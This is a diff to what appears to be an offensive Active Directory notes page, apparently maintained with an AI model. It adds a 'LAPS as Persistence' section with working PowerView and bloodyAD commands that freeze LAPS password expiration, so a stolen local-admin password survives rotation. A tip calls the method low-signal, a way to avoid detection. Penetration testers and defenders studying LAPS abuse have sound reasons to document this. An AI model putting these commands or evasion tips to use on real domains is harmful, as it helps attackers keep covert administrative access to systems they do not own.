@@ -122,6 +122,24 @@ nxc smb 192.168.1.0/24 -u Administrator -p '<LAPS-password>' --local-auth
 
 ---
 
+## LAPS as Persistence (with write access)
+
+Reading LAPS is transient — the password rotates and your access dies. If you hold write access to the computer object's LAPS attributes (e.g. from an ACL edge, or as the OU's delegated manager), you can **freeze rotation** to keep a known password alive:
+
+```powershell
+# Push the expiration far into the future → LAPS won't rotate, the current password stays valid.
+# ms-Mcs-AdmPwdExpirationTime (legacy) / msLAPS-PasswordExpirationTime (Windows LAPS) is a FILETIME.
+Set-DomainObject -Identity 'TARGET-PC$' -Set @{'ms-mcs-admpwdexpirationtime'='133700000000000000'} -Verbose   # PowerView
+```
+```bash
+# Linux equivalent — bloodyAD (or pyLAPS --set-expiration)
+bloodyAD -u user -p 'Password' -d corp.local --host <dc-ip> set object 'TARGET-PC$' ms-Mcs-AdmPwdExpirationTime -v 133700000000000000
+```
+
+> [!tip] Read the password **first**, then freeze the timestamp — now you have a persistent local-admin cred on that host that survives normal rotation, without touching the password itself (low-signal vs. writing `ms-Mcs-AdmPwd` directly).
+
+---
+
 ## Check LAPS Status via Registry (on target)
 
 ```powershell
@@ -165,5 +183,5 @@ ldapsearch -x -H ldap://<dc-ip> -D 'DOMAIN\user' -w 'Password' \
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-08-27*
+*Updated: 2026-09-01*
 *Model: claude-opus-5*
